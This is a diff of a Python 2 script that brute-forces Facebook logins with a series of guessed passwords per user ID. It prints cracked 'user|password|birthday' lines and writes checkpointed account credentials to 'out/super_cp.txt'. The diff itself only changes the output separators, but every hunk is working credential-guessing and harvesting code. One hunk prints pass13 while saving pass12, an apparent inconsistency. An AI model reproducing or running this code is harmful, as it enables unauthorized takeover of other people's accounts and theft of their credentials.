@@ -271,11 +271,11 @@ def pilih_indo():
 			if 'access_token' in w:
 				x = requests.get("https://graph.facebook.com/"+user+"?access_token="+w['access_token'])
 				z = json.loads(x.text)
-				print '\033[1;92m --> ' + user + ' - ' + pass1 + ' - ' + c['birthday']
+				print '\033[1;92m --> ' + user + '|' + pass1 + '|' + c['birthday']
 				oks.append(user+pass1)
 			else:
 				if 'www.facebook.com' in w['error_msg']:
-					print '\033[1;93m --> ' + user + ' - ' + pass1 + ' - ' + c['birthday']
+					print '\033[1;93m --> ' + user + '|' + pass1 + '|' + c['birthday']
 					cek = open("out/super_cp.txt", "a")
 					cek.write("ID:" +user+ " Pw:" +pass1+"\n")
 					cek.close()
@@ -287,11 +287,11 @@ def pilih_indo():
 					if 'access_token' in w:
 						x = requests.get("https://graph.facebook.com/"+user+"?access_token="+w['access_token'])
 						z = json.loads(x.text)
-						print '\033[1;92m --> ' + user + ' - ' + pass2 + ' - ' + c['birthday']
+						print '\033[1;92m --> ' + user + '|' + pass2 + '|' + c['birthday']
 						oks.append(user+pass2)
 					else:
 						if 'www.facebook.com' in w['error_msg']:
-							print '\033[1;93m --> ' + user + ' - ' + pass2 + ' - ' + c['birthday']
+							print '\033[1;93m --> ' + user + '|' + pass2 + '|' + c['birthday']
 							cek = open("out/super_cp.txt", "a")
 							cek.write("ID:" +user+ " Pw:" +pass2+"\n")
 							cek.close()
@@ -303,11 +303,11 @@ def pilih_indo():
 							if 'access_token' in w:
 								x = requests.get("https://graph.facebook.com/"+user+"?access_token="+w['access_token'])
 								z = json.loads(x.text)
-								print '\033[1;92m --> ' + user + ' - ' + pass3 + ' - ' + c['birthday']
+								print '\033[1;92m --> ' + user + '|' + pass3 + '|' + c['birthday']
 								oks.append(user+pass3)
 							else:
 								if 'www.facebook.com' in w['error_msg']:
-									print '\033[1;93m --> ' + user + ' - ' + pass3 + ' - ' + c['birthday']
+									print '\033[1;93m --> ' + user + '|' + pass3 + '|' + c['birthday']
 									cek = open("out/super_cp.txt", "a")
 									cek.write("ID:" +user+ " Pw:" +pass3+"\n")
 									cek.close()
@@ -319,11 +319,11 @@ def pilih_indo():
 									if 'access_token' in w:
 										x = requests.get("https://graph.facebook.com/"+user+"?access_token="+w['access_token'])
 										z = json.loads(x.text)
-										print '\033[1;92m --> ' + user + ' - ' + pass4 + ' - ' + c['birthday']
+										print '\033[1;92m --> ' + user + '|' + pass4 + '|' + c['birthday']
 										oks.append(user+pass4)
 									else:
 										if 'www.facebook.com' in w['error_msg']:
-											print '\033[1;93m --> ' + user + ' - ' + pass4 + ' - ' + c['birthday']
+											print '\033[1;93m --> ' + user + '|' + pass4 + '|' + c['birthday']
 											cek = open("out/super_cp.txt", "a")
 											cek.write("ID:" +user+ " Pw:" +pass4+"\n")
 											cek.close()
@@ -335,11 +335,11 @@ def pilih_indo():
 											if 'access_token' in w:
 												x = requests.get("https://graph.facebook.com/"+user+"?access_token="+w['access_token'])
 												z = json.loads(x.text)
-												print '\033[1;92m --> ' + user + ' - ' + pass5 + ' - ' + c['birthday']
+												print '\033[1;92m --> ' + user + '|' + pass5 + '|' + c['birthday']
 												oks.append(user+pass5)
 											else:
 												if 'www.facebook.com' in w['error_msg']:
-													print '\033[1;93m --> ' + user + ' - ' + pass5 + ' - ' + c['birthday']
+													print '\033[1;93m --> ' + user + '|' + pass5 + '|' + c['birthday']
 													cek = open("out/super_cp.txt", "a")
 													cek.write("ID:" +user+ " Pw:" +pass5+"\n")
 													cek.close()
@@ -351,11 +351,11 @@ def pilih_indo():
 													if 'access_token' in w:
 														x = requests.get("https://graph.facebook.com/"+user+"?access_token="+w['access_token'])
 														z = json.loads(x.text)
-														print '\033[1;92m --> ' + user + ' - ' + pass6 + ' - ' + c['birthday']
+														print '\033[1;92m --> ' + user + '|' + pass6 + '|' + c['birthday']
 														oks.append(user+pass6)
 													else:
 														if 'www.facebook.com' in w['error_msg']:
-															print '\033[1;93m --> ' + user + ' - ' + pass6 + ' - ' + c['birthday']
+															print '\033[1;93m --> ' + user + '|' + pass6 + '|' + c['birthday']
 															cek = open("out/super_cp.txt", "a")
 															cek.write("ID:" +user+ " Pw:" +pass6+"\n")
 															cek.close()
@@ -367,11 +367,11 @@ def pilih_indo():
 															if 'access_token' in w:
 																x = requests.get("https://graph.facebook.com/"+user+"?access_token="+w['access_token'])
 																z = json.loads(x.text)
-																print '\033[1;92m --> ' + user + ' - ' + pass7 + ' - ' + c['birthday']
+																print '\033[1;92m --> ' + user + '|' + pass7 + '|' + c['birthday']
 																oks.append(user+pass7)
 															else:
 																if 'www.facebook.com' in w['error_msg']:
-																	print '\033[1;93m --> ' + user + ' - ' + pass7 + ' - ' + c['birthday']
+																	print '\033[1;93m --> ' + user + '|' + pass7 + '|' + c['birthday']
 																	cek = open("out/super_cp.txt", "a")
 																	cek.write("ID:" +user+ " Pw:" +pass7+"\n")
 																	cek.close()
@@ -383,11 +383,11 @@ def pilih_indo():
 																	if 'access_token' in w:
 																		x = requests.get("https://graph.facebook.com/"+user+"?access_token="+w['access_token'])
 																		z = json.loads(x.text)
-																		print '\033[1;92m --> ' + user + ' - ' + pass8 + ' - ' + c['birthday']
+																		print '\033[1;92m --> ' + user + '|' + pass8 + '|' + c['birthday']
 																		oks.append(user+pass8)
 																	else:
 																		if 'www.facebook.com' in w['error_msg']:
-																			print '\033[1;93m --> ' + user + ' - ' + pass8 + ' - ' + c['birthday']
+																			print '\033[1;93m --> ' + user + '|' + pass8 + '|' + c['birthday']
 																			cek = open("out/super_cp.txt", "a")
 																			cek.write("ID:" +user+ " Pw:" +pass8+"\n")
 																			cek.close()
@@ -399,11 +399,11 @@ def pilih_indo():
 																				if 'access_token' in w:
 																					x = requests.get("https://graph.facebook.com/"+user+"?access_token="+w['access_token'])
 																					z = json.loads(x.text)
-																					print '\033[1;92m --> ' + user + ' - ' + pass9 + ' - ' + c['birthday']
+																					print '\033[1;92m --> ' + user + '|' + pass9 + '|' + c['birthday']
 																					oks.append(user+pass9)
 																				else:
 																					if 'www.facebook.com' in w['error_msg']:
-																						print '\033[1;93m --> ' + user + ' - ' + pass9 + ' - ' + c['birthday']
+																						print '\033[1;93m --> ' + user + '|' + pass9 + '|' + c['birthday']
 																						cek = open("out/super_cp.txt", "a")
 																						cek.write("ID:" +user+ " Pw:" +pass9+"\n")
 																						cek.close()
@@ -415,11 +415,11 @@ def pilih_indo():
 																						if 'access_token' in w:
 																							x = requests.get("https://graph.facebook.com/"+user+"?access_token="+w['access_token'])
 																							z = json.loads(x.text)
-																							print '\033[1;92m --> ' + user + ' - ' + pass10 + ' - ' + c['birthday']
+																							print '\033[1;92m --> ' + user + '|' + pass10 + '|' + c['birthday']
 																							oks.append(user+pass10)
 																						else:
 																							if 'www.facebook.com' in w['error_msg']:
-																								print '\033[1;93m --> ' + user + ' - ' + pass10 + ' - ' + c['birthday']
+																								print '\033[1;93m --> ' + user + '|' + pass10 + '|' + c['birthday']
 																								cek = open("out/super_cp.txt", "a")
 																								cek.write("ID:" +user+ " Pw:" +pass10+"\n")
 																								cek.close()
@@ -431,11 +431,11 @@ def pilih_indo():
 																								if 'access_token' in w:
 																									x = requests.get("https://graph.facebook.com/"+user+"?access_token="+w['access_token'])
 																									z = json.loads(x.text)
-																									print '\033[1;92m --> ' + user + ' - ' + pass11 + ' - ' + c['birthday']
+																									print '\033[1;92m --> ' + user + '|' + pass11 + '|' + c['birthday']
 																									oks.append(user+pass11)
 																								else:
 																									if 'www.facebook.com' in w['error_msg']:
-																										print '\033[1;93m --> ' + user + ' - ' + pass11 + ' - ' + c['birthday']
+																										print '\033[1;93m --> ' + user + '|' + pass11 + '|' + c['birthday']
 																										cek = open("out/super_cp.txt", "a")
 																										cek.write("ID:" +user+ " Pw:" +pass11+"\n")
 																										cek.close()
@@ -447,13 +447,13 @@ def pilih_indo():
 																										if 'access_token' in w:
 																											x = requests.get("https://graph.facebook.com/"+user+"?access_token="+w['access_token'])
 																											z = json.loads(x.text)
-																											print '\033[1;92m --> ' + user + ' - ' + pass12 + ' - ' + c['birthday']
+																											print '\033[1;92m --> ' + user + '|' + pass12 + '|' + c['birthday']
 																											oks.append(user+pass12)
 																										else:
 																											if 'www.facebook.com' in w['error_msg']:
-																												print '\033[1;93m --> ' + user + ' - ' + pass13 + ' - ' + c['birthday']
+																												print '\033[1;93m --> ' + user + '|' + pass13 + '|' + c['birthday']
 																												cek = open("out/super_cp.txt", "a")
-																												cek.write("ID:" +user+ " Pw:" +pass12+"\n")
+																												cek.write("ID:" +user+ " Pw:" +pass12+ "\n")
 																												cek.close()
 																												cekpoint.append(user+pass12)
 		except:
